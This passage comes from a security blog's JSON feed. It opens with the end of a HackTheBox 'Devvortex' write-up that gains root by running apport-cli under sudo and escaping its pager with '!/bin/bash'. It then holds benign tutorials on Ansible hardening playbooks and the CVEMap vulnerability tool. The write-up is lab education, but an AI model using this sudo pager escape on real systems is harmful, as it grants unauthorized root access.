data-slate-fragment=\"JTdCJTIyb2JqZWN0JTIyJTNBJTIyZG9jdW1lbnQlMjIlMkMlMjJkYXRhJTIyJTNBJTdCJTdEJTJDJTIybm9kZXMlMjIlM0ElNUIlN0IlMjJvYmplY3QlMjIlM0ElMjJibG9jayUyMiUyQyUyMnR5cGUlMjIlM0ElMjJwYXJhZ3JhcGglMjIlMkMlMjJpc1ZvaWQlMjIlM0FmYWxzZSUyQyUyMmRhdGElMjIlM0ElN0IlN0QlMkMlMjJub2RlcyUyMiUzQSU1QiU3QiUyMm9iamVjdCUyMiUzQSUyMnRleHQlMjIlMkMlMjJsZWF2ZXMlMjIlM0ElNUIlN0IlMjJvYmplY3QlMjIlM0ElMjJsZWFmJTIyJTJDJTIydGV4dCUyMiUzQSUyMmVzc2VudGlhbGx5JTIwd2UlMjBoYXZlJTIwdGhlJTIwYWJpbGl0eSUyMHRvJTIwcmVhZCUyMGElMjBjcmFzaCUyMHJlcG9ydCUyMGluJTIwYSUyMHZpJTIwbGlrZSUyMHByb2dyYW0lMkMlMjBmcm9tJTIwaGVyZSUyMHdlJTIwY2FuJTIwZXhlY3V0ZSUyMGJhc2glMjBhbmQlMjBqdW1wJTIwc3RyYWlnaHQlMjBpbnRvJTIwYSUyMHJvb3QlMjBiYXNoJTIwc2hlbGwlMjIlMkMlMjJtYXJrcyUyMiUzQSU1QiU1RCUyQyUyMnNlbGVjdGlvbnMlMjIlM0ElNUIlNUQlN0QlNUQlMkMlMjJrZXklMjIlM0ElMjI4VDZnR3pSQU5lVTYlMjIlN0QlNUQlMkMlMjJrZXklMjIlM0ElMjIzd3dwaWZTMlh2Um4lMjIlN0QlNUQlMkMlMjJrZXklMjIlM0ElMjIwcjlLU1dacFI1ZUIlMjIlN0Q=\">essentially we have the ability to read a crash report in a <code>vi</code> like program, from here we can execute bash and jump straight into a root bash shell.</span></p>\n<pre class=\"language-bash line-numbers\"><code>logan@devvortex:~$ sudo /usr/bin/apport-cli -f\n\n*** What kind of problem do you want to report?\n\n\nChoices:\n  1: Display (X.org)\n  2: External or internal storage devices (e. g. USB sticks)\n  3: Security related problems\n  4: Sound/audio related problems\n  5: dist-upgrade\n  6: installation\n  7: installer\n  8: release-upgrade\n  9: ubuntu-release-upgrader\n  10: Other problem\n  C: Cancel\nPlease choose (1/2/3/4/5/6/7/8/9/10/C): 1\n\n\n*** Collecting problem information\n\nThe collected information can be sent to the developers to improve the\napplication. This might take a few minutes.\n\n*** What display problem do you observe?\n\n\nChoices:\n  1: I don't know\n  2: Freezes or hangs during boot or usage\n  3: Crashes or restarts back to login screen\n  4: Resolution is incorrect\n  5: Shows screen corruption\n  6: Performance is worse than expected\n  7: Fonts are the wrong size\n  8: Other display-related problem\n  C: Cancel\nPlease choose (1/2/3/4/5/6/7/8/C): 2\n\n*** \n\nTo debug X freezes, please see https://wiki.ubuntu.com/X/Troubleshooting/Freeze\n\nPress any key to continue... \n\n..dpkg-query: no packages found matching xorg\n...............\n\n*** Send problem report to the developers?\n\nAfter the problem report has been sent, please fill out the form in the\nautomatically opened web browser.\n\nWhat would you like to do? Your options are:\n  S: Send report (1.6 KB)\n  V: View report\n  K: Keep report file for sending later or copying to somewhere else\n  I: Cancel and ignore future crashes of this program version\n  C: Cancel\nPlease choose (S/V/K/I/C): !\nWhat would you like to do? Your options are:\n  S: Send report (1.6 KB)\n  V: View report\n  K: Keep report file for sending later or copying to somewhere else\n  I: Cancel and ignore future crashes of this program version\n  C: Cancel\nPlease choose (S/V/K/I/C): v\nroot@devvortex:/home/logan# </code></pre>\n<p id=\"9de9\" class=\"pw-post-body-paragraph mi mj gr mk b ml mm mn mo mp mq mr ms mt mu mv mw mx my mz na nb nc nd ne nf gk bj\" data-selectable-paragraph=\"\">After executing the command, when prompted, type <code class=\"cw ok ol om on b\">V</code>and wait it for some seconds. Let the<code class=\"cw ok ol om on b\">apport-cli</code> to load all its magic.</p>\n<p id=\"feb1\" class=\"pw-post-body-paragraph mi mj gr mk b ml mm mn mo mp mq mr ms mt mu mv mw mx my mz na nb nc nd ne nf gk bj\" data-selectable-paragraph=\"\">As soon as you <code class=\"cw ok ol om on b\">:</code> symbol, the pager is there!</p>\n<p id=\"f73e\" class=\"pw-post-body-paragraph mi mj gr mk b ml mm mn mo mp mq mr ms mt mu mv mw mx my mz na nb nc nd ne nf gk bj\" data-selectable-paragraph=\"\">Let’s run <code class=\"cw ok ol om on b\">!/bin/bash</code> to spawn the shell as root (remember, we started the <code class=\"cw ok ol om on b\">apport-cli</code> executable with <code class=\"cw ok ol om on b\">sudo</code>)</p>\n<p>Hurrah, now we got the root shell!!!</p>\n<figure class=\"post__image\"><img loading=\"lazy\"  src=\"https://sakibulalikhan.pages.dev/media/posts/20/Devvortex-HTB-Writeup17.png\" alt=\"Devvortex - HTB Writeup\" width=\"510\" height=\"139\" sizes=\"(min-width: 920px) 703px, (min-width: 700px) calc(82vw - 35px), calc(100vw - 81px)\" srcset=\"https://sakibulalikhan.pages.dev/media/posts/20/responsive/Devvortex-HTB-Writeup17-xs.png 300w ,https://sakibulalikhan.pages.dev/media/posts/20/responsive/Devvortex-HTB-Writeup17-sm.png 480w ,https://sakibulalikhan.pages.dev/media/posts/20/responsive/Devvortex-HTB-Writeup17-md.png 768w ,https://sakibulalikhan.pages.dev/media/posts/20/responsive/Devvortex-HTB-Writeup17-lg.png 1024w\"></figure>\n<p>We have our <strong class=\"mk gs\">Devvortex </strong>machine, successfully rooted!</p>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>",
            "image": "https://sakibulalikhan.pages.dev/media/posts/20/Devvortex-HTB-Writeup1.png",
            "author": {
                "name": "Sakibul Ali Khan"
            },
            "tags": [
                   "Linux Privilege Escalations",
                   "HackTheBox",
                   "CVE",
                   "CTF Writeups"
            ],
            "date_published": "2024-02-09T04:25:15+06:00",
            "date_modified": "2024-02-09T15:22:39+06:00"
        },
        {
            "id": "https://sakibulalikhan.pages.dev/ansible-zero-to-hero-for-hackers-a-practical-guide-for-cybersecurity-enthusiasts.html",
            "url": "https://sakibulalikhan.pages.dev/ansible-zero-to-hero-for-hackers-a-practical-guide-for-cybersecurity-enthusiasts.html",
            "title": "Ansible Zero to Hero For Hackers: A Practical Guide for Cybersecurity Enthusiasts",
            "summary": "In the dynamic realm of cybersecurity, automation is the key to efficiency, and Ansible is the chosen weapon for the discerning hacker. This blog post&hellip;",
            "content_html": "<div class=\"cl-preview-section\">\n<div class=\"cl-preview-section\">\n<p>In the dynamic realm of cybersecurity, automation is the key to efficiency, and Ansible is the chosen weapon for the discerning hacker. This blog post will take you on a journey from zero to hero, exploring how Ansible, an open-source automation tool, can elevate your cybersecurity game.</p>\n</div>\n<div class=\"cl-preview-section\">\n<h3 id=\"what-is-ansible\">What is Ansible?</h3>\n</div>\n<div class=\"cl-preview-section\">\n<figure class=\"post__image\"><img loading=\"lazy\"  src=\"https://sakibulalikhan.pages.dev/media/posts/18/what-is-ansible-removebg-preview.png\" alt=\"what-is-ansible\" width=\"340\" height=\"306\" sizes=\"(min-width: 920px) 703px, (min-width: 700px) calc(82vw - 35px), calc(100vw - 81px)\" srcset=\"https://sakibulalikhan.pages.dev/media/posts/18/responsive/what-is-ansible-removebg-preview-xs.png 300w ,https://sakibulalikhan.pages.dev/media/posts/18/responsive/what-is-ansible-removebg-preview-sm.png 480w ,https://sakibulalikhan.pages.dev/media/posts/18/responsive/what-is-ansible-removebg-preview-md.png 768w ,https://sakibulalikhan.pages.dev/media/posts/18/responsive/what-is-ansible-removebg-preview-lg.png 1024w\"></figure>\n<p>In the vast landscape of automation tools, Ansible emerges as a superhero, simplifying complex tasks and orchestrating seamless operations. Ansible is not just a tool; it’s your sidekick in the cybersecurity battlefield. As a configuration management and automation platform, Ansible allows you to define and automate the deployment and configuration of systems with ease.</p>\n</div>\n<div class=\"cl-preview-section\">\n<h4 id=\"key-features\">Key Features:</h4>\n</div>\n<div class=\"cl-preview-section\">\n<ul>\n<li>\n<p><strong>Agentless Architecture:</strong> Ansible’s agentless design eliminates the need for additional software on managed systems, making it lightweight and straightforward to deploy.</p>\n</li>\n<li>\n<p><strong>Simplicity:</strong> With Ansible, automation becomes accessible. Its human-readable, YAML-based syntax ensures that even hackers new to automation can quickly grasp its power.</p>\n</li>\n<li>\n<p><strong>Flexibility:</strong> Ansible doesn’t impose a rigid structure. It adapts to your environment, whether you’re managing a handful of servers or orchestrating a large-scale operation.</p>\n</li>\n<li>\n<p><strong>Extensibility:</strong> Ansible is not confined to a specific domain. Its modular design allows for seamless integration with existing tools and technologies, enhancing its versatility.</p>\n</li>\n</ul>\n</div>\n<h3 id=\"why-ansible\">Why Ansible?</h3>\n<figure class=\"post__image\"><img loading=\"lazy\"  src=\"https://sakibulalikhan.pages.dev/media/posts/18/Why-Ansible.png\" alt=\"Why Ansible\" width=\"280\" height=\"213\" sizes=\"(min-width: 920px) 703px, (min-width: 700px) calc(82vw - 35px), calc(100vw - 81px)\" srcset=\"https://sakibulalikhan.pages.dev/media/posts/18/responsive/Why-Ansible-xs.png 300w ,https://sakibulalikhan.pages.dev/media/posts/18/responsive/Why-Ansible-sm.png 480w ,https://sakibulalikhan.pages.dev/media/posts/18/responsive/Why-Ansible-md.png 768w ,https://sakibulalikhan.pages.dev/media/posts/18/responsive/Why-Ansible-lg.png 1024w\"></figure>\n</div>\n<div class=\"cl-preview-section\">\n<p>Ansible stands out in the automation landscape for its simplicity and agentless architecture. Leveraging SSH to connect to servers, Ansible ensures ease of setup and usage. Whether you’re handling a compact infrastructure or orchestrating a large-scale deployment, Ansible offers a robust and flexible solution.</p>\n</div>\n<div class=\"cl-preview-section\">\n<h3 id=\"installation\">Installation:</h3>\n</div>\n<div class=\"cl-preview-section\">\n<p>Let’s dive into the installation process to kickstart your Ansible journey. For this guide, we’ll focus on installing Ansible on a Linux-based system.</p>\n</div>\n<div class=\"cl-preview-section\">\n<h4 id=\"step-1-update-your-system\">Step 1: Update Your System</h4>\n</div>\n<div class=\"cl-preview-section\">\n<p>Before delving into Ansible, ensure your system is up to date:</p>\n</div>\n<div class=\"cl-preview-section\">\n<pre class=\"language-bash line-numbers\"><code>sudo apt update\nsudo apt upgrade -y\n</code></pre>\n</div>\n<div class=\"cl-preview-section\">\n<h4 id=\"step-2-install-ansible\">Step 2: Install Ansible</h4>\n</div>\n<div class=\"cl-preview-section\">\n<p>Install Ansible using your package manager. For Ubuntu/Debian-based systems:</p>\n</div>\n<div class=\"cl-preview-section\">\n<pre class=\"language-bash line-numbers\"><code>sudo apt install ansible -y\n</code></pre>\n</div>\n<div class=\"cl-preview-section\">\n<p>For Red Hat/CentOS-based systems:</p>\n</div>\n<div class=\"cl-preview-section\">\n<pre class=\"language-bash line-numbers\"><code>sudo yum install ansible -y\n</code></pre>\n</div>\n<div class=\"cl-preview-section\">\n<h4 id=\"step-3-verify-installation\">Step 3: Verify Installation</h4>\n</div>\n<div class=\"cl-preview-section\">\n<p>Confirm the installation by checking the Ansible version:</p>\n</div>\n<div class=\"cl-preview-section\">\n<pre class=\"language-bash line-numbers\"><code>ansible --version\n</code></pre>\n</div>\n<div class=\"cl-preview-section\">\n<p>You should see output displaying the installed Ansible version.</p>\n</div>\n<div class=\"cl-preview-section\">\n<h3 id=\"basic-configuration-and-setup\">Basic Configuration and Setup:</h3>\n</div>\n<div class=\"cl-preview-section\">\n<p>Now that Ansible is successfully installed, let’s perform some basic configuration to set the stage for automation.</p>\n</div>\n<div class=\"cl-preview-section\">\n<h4 id=\"step-1-create-an-ansible-configuration-file\">Step 1: Create an Ansible Configuration File</h4>\n</div>\n<div class=\"cl-preview-section\">\n<p>Ansible utilizes a configuration file (ansible.cfg) to manage settings. Create one in your home directory:</p>\n</div>\n<div class=\"cl-preview-section\">\n<pre class=\"language-bash line-numbers\"><code>touch ~/.ansible.cfg\n</code></pre>\n</div>\n<div class=\"cl-preview-section\">\n<h4 id=\"step-2-configure-ansible\">Step 2: Configure Ansible</h4>\n</div>\n<div class=\"cl-preview-section\">\n<p>Open ~/.ansible.cfg in a text editor and add the following basic configuration:</p>\n</div>\n<div class=\"cl-preview-section\">\n<pre class=\"language-ini line-numbers\"><code>[defaults]\ninventory = ~/ansible_inventory\nremote_user = your_username\n</code></pre>\n</div>\n<div class=\"cl-preview-section\">\n<p>Replace your_username with your actual username. This configuration specifies the inventory file location and the default remote user.</p>\n</div>\n<div class=\"cl-preview-section\">\n<h4 id=\"step-3-create-an-inventory-file\">Step 3: Create an Inventory File</h4>\n</div>\n<div class=\"cl-preview-section\">\n<p>The inventory file defines the hosts Ansible will manage. Create a simple inventory file (ansible_inventory) in your home directory:</p>\n</div>\n<div class=\"cl-preview-section\">\n<pre class=\"language-ini line-numbers\"><code>[web_servers]\nserver1 ansible_host=your_server_ip\nserver2 ansible_host=your_server_ip\n</code></pre>\n</div>\n<div class=\"cl-preview-section\">\n<p>Replace your_server_ip with the actual IP addresses of your servers.</p>\n</div>\n<div class=\"cl-preview-section\">\n<h4 id=\"step-4-test-ansible-connectivity\">Step 4: Test Ansible Connectivity</h4>\n</div>\n<div class=\"cl-preview-section\">\n<p>Ensure Ansible can connect to your servers:</p>\n</div>\n<div class=\"cl-preview-section\">\n<pre class=\"language-bash line-numbers\"><code>ansible -m ping -i ~/ansible_inventory all\n</code></pre>\n</div>\n<div class=\"cl-preview-section\">\n<p>If everything is set up correctly, you should see a successful ping response from your servers.</p>\n</div>\n<div class=\"cl-preview-section\">\n<h3 id=\"real-world-cybersecurity-project-examples\">Real-world Cybersecurity Project Examples:</h3>\n</div>\n<div class=\"cl-preview-section\">\n<h4 id=\"automating-security-patch-management\">Automating Security Patch Management:</h4>\n</div>\n<div class=\"cl-preview-section\">\n<p>In the realm of cybersecurity, timely application of security patches is paramount. Ansible proves to be a valuable ally in automating the patching process across multiple servers, ensuring that vulnerabilities are promptly addressed.</p>\n</div>\n<div class=\"cl-preview-section\">\n<p>Consider this analogy: Imagine your servers are the guardians of a fortress, and security patches are the shields that reinforce their defenses. Ansible, in this context, becomes the blacksmith forging these shields efficiently.</p>\n</div>\n<div class=\"cl-preview-section\">\n<pre class=\"language-yaml line-numbers\"><code>---\n- name: Apply Security Updates\n  hosts: web_servers\n  become: yes\n  tasks:\n    - name: Update package repositories\n      apt: update_cache=yes\n      when: ansible_os_family == 'Debian'\n\n    - name: Install security updates\n      apt: upgrade=dist\n      when: ansible_os_family == 'Debian'\n\n    - name: Update package repositories\n      yum: check_update_only=yes\n      when: ansible_os_family == 'RedHat'\n\n    - name: Install security updates\n      yum: name='*' state=latest\n      when: ansible_os_family == 'RedHat'\n</code></pre>\n</div>\n<div class=\"cl-preview-section\">\n<p>Imagine Ansible as the diligent scribe noting which shields need reinforcement and ensuring that each guardian receives the necessary upgrades. With this script, you’re not manually handing out shields; instead, Ansible automates the distribution, making your fortress more resilient against potential cyber threats.</p>\n</div>\n<div class=\"cl-preview-section\">\n<h4 id=\"securing-ssh-configuration\">Securing SSH Configuration:</h4>\n</div>\n<div class=\"cl-preview-section\">\n<p>Securing SSH configurations is akin to fortifying the entrance to your digital castle. Ansible can assist in enforcing secure SSH settings across multiple servers, reducing the risk of unauthorized access.</p>\n</div>\n<div class=\"cl-preview-section\">\n<p>Let’s simplify it: Think of SSH as the drawbridge to your castle. By default, it might be wide open for anyone to cross. Ansible, acting as the castle’s guardian, ensures that only trusted entities can pass through by configuring the drawbridge securely.</p>\n</div>\n<div class=\"cl-preview-section\">\n<pre class=\"language-yaml line-numbers\"><code>---\n- name: Secure SSH Configuration\n  hosts: web_servers\n  become: yes\n  tasks:\n    - name: Disable root login\n      lineinfile:\n        path: /etc/ssh/sshd_config\n        regexp: '^PermitRootLogin'\n        line: 'PermitRootLogin no'\n      notify: Restart SSH\n\n    - name: Set SSH protocol version\n      lineinfile:\n        path: /etc/ssh/sshd_config\n        regexp: '^Protocol'\n        line: 'Protocol 2'\n      notify: Restart SSH\n\n  handlers:\n    - name: Restart SSH\n      service:\n        name: sshd\n        state: restarted\n</code></pre>\n</div>\n<div class=\"cl-preview-section\">\n<p>Picture Ansible as the castle architect implementing security measures, like raising the drawbridge for root access and fortifying the protocol version. The script ensures that only the rightful inhabitants with the correct credentials can traverse the digital drawbridge securely.</p>\n</div>\n<div class=\"cl-preview-section\">\n<h3 id=\"conclusion\">Conclusion:</h3>\n</div>\n<div class=\"cl-preview-section\">\n<p>Congratulations! You’ve successfully installed Ansible and laid the foundation for automating tasks and managing infrastructure efficiently. The real-world examples provided demonstrate how Ansible can be applied in cybersecurity projects, from patch management to securing SSH configurations.</p>\n</div>\n<div class=\"cl-preview-section\">\n<p>In the next blog post, we’ll delve into writing Ansible playbooks and executing ad-hoc commands for more advanced automation.</p>\n</div>\n<div class=\"cl-preview-section\">\n<p>Stay tuned for more Ansible adventures!</p>\n</div>",
            "image": "https://sakibulalikhan.pages.dev/media/posts/18/Ansible-Zero-to-Hero-For-Hackers-A-Practical-Guide-for-Cybersecurity-Enthusiasts.png",
            "author": {
                "name": "Sakibul Ali Khan"
            },
            "tags": [
                   "DevSecOps",
                   "Cyber Security",
                   "Cloud Security",
                   "Ansible"
            ],
            "date_published": "2024-02-05T02:31:54+06:00",
            "date_modified": "2024-02-07T16:57:16+06:00"
        },
        {
            "id": "https://sakibulalikhan.pages.dev/unveiling-vulnerabilities-with-cvemap-navigating-the-cybersecurity-jungle.html",
            "url": "https://sakibulalikhan.pages.dev/unveiling-vulnerabilities-with-cvemap-navigating-the-cybersecurity-jungle.html",
            "title": "Unveiling Vulnerabilities with CVEMap: Navigating the Cybersecurity Jungle",
            "summary": "In the ever-evolving world of cybersecurity, the rise in reported Common Vulnerabilities and Exposures (CVEs) poses a significant challenge for security professionals. The sheer volume&hellip;",
            "content_html": "<div class=\"cl-preview-section\">\n<p>In the ever-evolving world of cybersecurity, the rise in reported Common Vulnerabilities and Exposures (CVEs) poses a significant challenge for security professionals. The sheer volume and occasionally exaggerated severity of these vulnerabilities can create a “noise” that distracts from critical security efforts. Enter CVEMap, a powerful and user-friendly tool designed by ProjectDiscovery to simplify the exploration of CVEs and enhance cybersecurity decision-making.</p>\n</div>\n<div class=\"cl-preview-section\">\n<h2 id=\"understanding-cvemap\">Understanding CVEMap</h2>\n</div>\n<div class=\"cl-preview-section\">\n<p>CVEMap is a command-line interface (CLI) tool developed to provide a structured and easily navigable way to explore CVEs. It addresses the challenges posed by the overwhelming number of vulnerabilities by consolidating data from various public sources, including the National Vulnerability Database (NVD), CISA’s Known Exploited Vulnerabilities Catalog (KEV), HackerOne’s CVE Discovery, and more.</p>\n</div>\n<div class=\"cl-preview-section\"> </div>\n<div class=\"cl-preview-section\">\n<div class=\"cl-preview-section\">\n<h2 id=\"why-cvemap-matters-for-cybersecurity-professionals\">Why CVEMap Matters for Cybersecurity Professionals</h2>\n</div>\n<div class=\"cl-preview-section\">\n<h3 id=\"multidimensional-prioritization\">1. Multidimensional Prioritization</h3>\n</div>\n<div class=\"cl-preview-section\">\n<p>CVEMap transcends traditional vulnerability scoring systems. It adopts a multidimensional perspective, weighing factors like exploitability, critical due dates, and probabilistic assessments. This holistic approach ensures a comprehensive analysis, facilitating the effective prioritization of vulnerabilities.</p>\n</div>\n<div class=\"cl-preview-section\">\n<h3 id=\"diverse-data-sources\">2. Diverse Data Sources</h3>\n</div>\n<div class=\"cl-preview-section\">\n<p>Harnessing the power of sources such as KEV (Known Exploited Vulnerabilities), EPSS (Exploit Prediction Scoring System), Proofs of Concept (POCs), and HackerOne CVE Discovery, CVEMap paints a vivid picture of the threat landscape. By considering actively exploited vulnerabilities, exploit prediction scores, and bug bounty reports, it provides cybersecurity professionals with a nuanced understanding of potential threats.</p>\n</div>\n<div class=\"cl-preview-section\">\n<h3 id=\"user-friendly-interface\">3. User-Friendly Interface</h3>\n</div>\n<div class=\"cl-preview-section\">\n<p>CVEMap is purpose-built for practitioners and security engineers who prioritize genuine security measures over compliance checkboxes. Its structured format and customizable filters make it accessible for professionals at all levels. Navigating the tool is intuitive, enhancing the user experience for those deeply entrenched in the field.</p>\n</div>\n</div>\n<div class=\"cl-preview-section\">\n<h2 id=\"key-features-of-cvemap\">Key Features of CVEMap</h2>\n</div>\n<div class=\"cl-preview-section\">\n<ol>\n<li>\n<p><strong>Mapping Capabilities:</strong><br>CVE to EPSS, KEV, CPE, GitHub POCs, Nuclei Template, and HackerOne report mapping functionalities enhance the understanding of vulnerabilities.</p>\n</li>\n<li>\n<p><strong>Customizable Filters:</strong><br>Users can tailor their queries based on various criteria such as vendor, product, severity, and more, allowing for personalized and targeted exploration.</p>\n</li>\n<li>\n<p><strong>User-Friendly Output:</strong><br>The tool supports JSON output and provides a clean, structured output format. It enables users to choose the fields they want to display and exclude, making the information easily digestible.</p>\n</li>\n</ol>\n</div>\n<div class=\"cl-preview-section\">\n<h2 id=\"getting-started-with-cvemap\">Getting Started with CVEMap</h2>\n</div>\n<div class=\"cl-preview-section\">\n<h3 id=\"installation\">Installation:</h3>\n</div>\n<div class=\"cl-preview-section\">\n<p>Installing CVEMap is straightforward. With Go 1.21 or later, users can run a simple command or download pre-compiled binaries from the release page.</p>\n</div>\n<div class=\"cl-preview-section\">\n<pre class=\"language-bash line-numbers\"><code>go install github.com/projectdiscovery/cvemap/cmd/cvemap@latest\n</code></pre>\n</div>\n<div class=\"cl-preview-section\">\n<h3 id=\"configuration\">Configuration:</h3>\n</div>\n<div class=\"cl-preview-section\">\n<p>To use CVEMap, users need a ProjectDiscovery Cloud Platform (PDCP) account and API key. Configuration is simple and can be done using environment variables or an interactive authentication option.</p>\n</div>\n<div class=\"cl-preview-section\">\n<pre class=\"language-bash line-numbers\"><code>cvemap -auth\n</code></pre>\n</div>\n<div class=\"cl-preview-section\">\n<figure class=\"post__image\"><img loading=\"lazy\"  src=\"https://sakibulalikhan.pages.dev/media/posts/17/cvemap-auth.png\" alt=\"cvemap -auth\" width=\"547\" height=\"187\" sizes=\"(min-width: 920px) 703px, (min-width: 700px) calc(82vw - 35px), calc(100vw - 81px)\" srcset=\"https://sakibulalikhan.pages.dev/media/posts/17/responsive/cvemap-auth-xs.png 300w ,https://sakibulalikhan.pages.dev/media/posts/17/responsive/cvemap-auth-sm.png 480w ,https://sakibulalikhan.pages.dev/media/posts/17/responsive/cvemap-auth-md.png 768w ,https://sakibulalikhan.pages.dev/media/posts/17/responsive/cvemap-auth-lg.png 1024w\"></figure>\n<h3 id=\"running-cvemap\">Running CVEMap:</h3>\n</div>\n<div class=\"cl-preview-section\">\n<p>The tool provides various options for searching and filtering CVE data. Users can explore known exploited vulnerabilities, filter by severity, vendor, or product, and even display results in JSON format.</p>\n</div>\n<div class=\"cl-preview-section\">\n<pre class=\"language-bash line-numbers\"><code>cvemap --limit 10\n</code></pre>\n</div>\n<div class=\"cl-preview-section\">\n<div class=\"cl-preview-section\">\n<figure class=\"post__image\"><img loading=\"lazy\"  src=\"https://sakibulalikhan.pages.dev/media/posts/17/cvemap-limit-10-2.png\" alt=\"cvemap --limit 10\" width=\"492\" height=\"271\" sizes=\"(min-width: 920px) 703px, (min-width: 700px) calc(82vw - 35px), calc(100vw - 81px)\" srcset=\"https://sakibulalikhan.pages.dev/media/posts/17/responsive/cvemap-limit-10-2-xs.png 300w ,https://sakibulalikhan.pages.dev/media/posts/17/responsive/cvemap-limit-10-2-sm.png 480w ,https://sakibulalikhan.pages.dev/media/posts/17/responsive/cvemap-limit-10-2-md.png 768w ,https://sakibulalikhan.pages.dev/media/posts/17/responsive/cvemap-limit-10-2-lg.png 1024w\"></figure>\n<h2 id=\"usage-examples\">Usage Examples</h2>\n</div>\n<div class=\"cl-preview-section\">\n<h3 id=\"basic-usage\">Basic Usage</h3>\n</div>\n<div class=\"cl-preview-section\">\n<p>To get acquainted with CVEMap, run the following command to display the tool’s help information:</p>\n</div>\n<div class=\"cl-preview-section\">\n<pre class=\"language-bash line-numbers\"><code>cvemap -h\n\nNavigate the CVE jungle with ease.\n\nUsage:\n  cvemap [flags]\n\nFlags:\nCONFIG:\n   -auth  configure projectdiscovery cloud (pdcp) api key\n\nOPTIONS:\n   -id string[]                    cve to list for given id\n   -cwe, -cwe-id string[]          cve to list for given cwe id\n   -v, -vendor string[]            cve to list for given vendor\n   -p, -product string[]           cve to list for given product\n   -eproduct string[]              cves to exclude based on products\n   -s, -severity string[]          cve to list for given severity\n   -cs, -cvss-score string[]       cve to list for given cvss score\n   -c, -cpe string                 cve to list for given cpe\n   -es, -epss-score string         cve to list for given epss score\n   -ep, -epss-percentile string[]  cve to list for given epss percentile\n   -age string                     cve to list published by given age in days\n   -a, -assignee string[]          cve to list for given publisher assignee\n   -vs, -vstatus value             cve to list for given vulnerability status in cli output. supported: modified, rejected, unknown, new, confirmed, unconfirmed\n\nUPDATE:\n   -up, -update                 update cvemap to latest version\n   -duc, -disable-update-check  disable automatic cvemap update check\n\nFILTER:\n   -q, -search string  search in cve data\n   -k, -kev            display cves marked as exploitable vulnerabilities by cisa (default true)\n   -t, -template       display cves that has public nuclei templates (default true)\n   -poc                display cves that has public published poc (default true)\n   -h1, -hackerone     display cves reported on hackerone (default true)\n   -re, -remote        display remotely exploitable cves (AV:N &amp; PR:N | PR:L) (default true)\n\nOUTPUT:\n   -f, -field value         fields to display in cli output. supported: product, vendor, vstatus, age, kev, template, poc, epss, cwe, assignee, \n   -fe, -exclude value      fields to exclude from cli output. supported: product, vendor, vstatus, age, kev, template, poc, epss, cwe, assignee, \n   -lsi, -list-id           list only the cve ids in the output\n   -l, -limit int           limit the number of results to display (default 50)\n   -offset int              offset the results to display\n   -j, -json                return output in json format\n   -epk, -enable-page-keys  enable page keys to navigate results\n\nDEBUG:\n   -version  Version\n   -silent   Silent\n   -verbose  Verbose\n   -debug    Debug</code></pre>\n</div>\n<div class=\"cl-preview-section\">\n<p>This command provides an overview of all available switches and options.</p>\n</div>\n<div class=\"cl-preview-section\">\n<h3 id=\"example-finding-application-cves\">Example: Finding Application CVEs</h3>\n</div>\n<div class=\"cl-preview-section\">\n<p>Imagine you’re responsible for the security of a web application, and you want to quickly identify any known vulnerabilities that might affect its components. Let’s use CVEMap to find CVEs associated with the popular web server software, Apache HTTP Server:</p>\n</div>\n<div class=\"cl-preview-section\">\n<pre class=\"language-bash line-numbers\"><code>cvemap -product apache -l 5\n</code></pre>\n</div>\n<div class=\"cl-preview-section\">\n<figure class=\"post__image\"><img loading=\"lazy\"  src=\"https://sakibulalikhan.pages.dev/media/posts/17/cvemap-product-apache-l-5-2.png\" alt=\"cvemap -product apache -l 5\" width=\"587\" height=\"235\" sizes=\"(min-width: 920px) 703px, (min-width: 700px) calc(82vw - 35px), calc(100vw - 81px)\" srcset=\"https://sakibulalikhan.pages.dev/media/posts/17/responsive/cvemap-product-apache-l-5-2-xs.png 300w ,https://sakibulalikhan.pages.dev/media/posts/17/responsive/cvemap-product-apache-l-5-2-sm.png 480w ,https://sakibulalikhan.pages.dev/media/posts/17/responsive/cvemap-product-apache-l-5-2-md.png 768w ,https://sakibulalikhan.pages.dev/media/posts/17/responsive/cvemap-product-apache-l-5-2-lg.png 1024w\"></figure>\n<p>To extract more detailed information about the identified CVEs, customize the output to display crucial information:</p>\n</div>\n<div class=\"cl-preview-section\">\n<pre class=\"language-bash line-numbers\"><code>cvemap -product wordpress -field epss, product, severity, kev, age -l 5</code></pre>\n</div>\n<div class=\"cl-preview-section\">\n<figure class=\"post__image\"><img loading=\"lazy\"  src=\"https://sakibulalikhan.pages.dev/media/posts/17/cvemap-product-wordpress-field-epss-product-severity-kev-age-l-5.png\" alt=\"cvemap -product wordpress -field epss, product, severity, kev, age -l 5\" width=\"504\" height=\"300\" sizes=\"(min-width: 920px) 703px, (min-width: 700px) calc(82vw - 35px), calc(100vw - 81px)\" srcset=\"https://sakibulalikhan.pages.dev/media/posts/17/responsive/cvemap-product-wordpress-field-epss-product-severity-kev-age-l-5-xs.png 300w ,https://sakibulalikhan.pages.dev/media/posts/17/responsive/cvemap-product-wordpress-field-epss-product-severity-kev-age-l-5-sm.png 480w ,https://sakibulalikhan.pages.dev/media/posts/17/responsive/cvemap-product-wordpress-field-epss-product-severity-kev-age-l-5-md.png 768w ,https://sakibulalikhan.pages.dev/media/posts/17/responsive/cvemap-product-wordpress-field-epss-product-severity-kev-age-l-5-lg.png 1024w\"></figure>\n<p>This example showcases the versatility of CVEMap in uncovering vulnerabilities specific to widely used web server software.</p>\n</div>\n<h2 id=\"conclusion\">Conclusion</h2>\n</div>\n<div class=\"cl-preview-section\">\n<p>CVEMap from ProjectDiscovery is a game-changer in the cybersecurity space. For professionals, it offers advanced capabilities for prioritizing and understanding vulnerabilities, while its user-friendly interface makes it accessible for individuals looking to gain insights into the world of cybersecurity. Whether you’re a seasoned cybersecurity expert or someone curious about online threats, CVEMap provides a valuable tool for navigating the complex landscape of CVEs.</p>\n</div>\n<div class=\"cl-preview-section\">\n<p>For more information and to get started, visit the <a href=\"https://github.com/projectdiscovery/cvemap\">CVEMap GitHub repository</a> and explore the official <a href=\"https://docs.projectdiscovery.io/tools/cvemap/\">documentation</a>.</p>\n</div>\n<div class=\"cl-preview-section\">\n<p>Remember, in the face of growing cyber threats, knowledge is the best defense. CVEMap empowers you to stay informed and take proactive measures in the ever-changing cybersecurity landscape. Stay secure, stay vigilant!</p>\n</div>",
            "image": "https://sakibulalikhan.pages.dev/media/posts/17/Unveiling-Vulnerabilities-with-CVEMap-Navigating-the-Cybersecurity-Jungle.png",
            "author": {
                "name": "Sakibul Ali Khan"
            },
            "tags": [
                   "Hacking Tools",
                   "Cloud Security",
                   "CVE"
            ],
            "date_published": "2024-02-02T05:07:38+06:00",
